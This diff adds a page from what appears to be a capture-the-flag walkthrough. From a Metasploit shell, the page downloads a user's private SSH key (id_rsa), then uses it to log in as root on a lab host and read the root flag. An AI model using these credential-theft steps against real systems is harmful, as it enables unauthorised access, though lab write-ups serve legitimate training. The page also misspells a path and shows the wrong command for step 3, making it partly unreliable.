@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>5.4 Connect via SSH (Second flag)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>5.4 Connect via SSH (Second flag)</h1><br/><p></p><p>1. On your Metasploit shell go to “/home/primavera/.ssh”.</p><p>    <div class="codebox"><pre><span style="color:#a52a2a;font-weight:700">cd</span> <span style="color:#a52a2a;font-weight:700">/</span>home<span style="color:#a52a2a;font-weight:700">/</span>primaver<span style="color:#a52a2a;font-weight:700">/</span>.ssh</pre></div></p><p>   </p><p>2. Download to your Kali Machine the “id_rsa” file in that directory. (It will be save in the directory from you ran “metasploit”).</p><p>    <div class="codebox"><pre>download id_rsa id_rsa<br /></pre></div></p><p></p><p>3. Change the “id_rsa” permissions.</p><p>    <div class="codebox"><pre>$ <span style="color:#a52a2a;font-weight:700">ssh</span> root@192.168.12.73 -i id_rsa</pre></div></p><p>   </p><p>4. From your Kali Machine connect via SSH with that file.</p><p>    <div class="codebox"><pre>$ <span style="color:#a52a2a;font-weight:700">ssh</span> root@192.168.12.73 -i id_rsa</pre></div></p><p>    <span style="color:#ffa500;">Output:</span>   </p><p>    <img src="images/1104-1.png" alt="images/1104-1.png" /></p><p></p><p>5. Get the flag.</p><p>    <div class="codebox"><pre>root@bounty<span style="color:#a52a2a;font-weight:700">:</span>~# <span style="color:#a52a2a;font-weight:700">cat</span> root.txt<br /></pre></div></p><p></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1104-2.png" alt="images/1104-2.png" /></p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
+</body>
+</html>
